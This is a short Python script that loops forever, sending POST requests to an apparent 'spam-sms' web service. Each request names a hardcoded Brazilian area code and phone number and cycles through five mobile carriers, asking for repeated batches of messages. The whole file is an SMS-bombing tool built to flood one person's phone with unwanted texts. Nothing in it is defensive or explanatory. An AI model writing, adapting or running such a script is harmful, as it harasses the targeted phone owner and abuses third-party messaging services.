__author__ = 'luan'
import requests


ddd = 21		
numero = 966512557
quant = 9
operadora = ['claro','vivo','tim','oi','nextel']
cont = 0
while(True):
    for x in operadora:
        cont = cont + 1
        response_serv1 = requests.post('http://idwap.mobi/spam-sms/index.php',data={'DDD':str(ddd),'CEL':str(numero),'OPE':str(x),'QUANTIDADE':str(quant)})
        print 'serv1 Status :'+str(cont)
        print response_serv1.status_code
      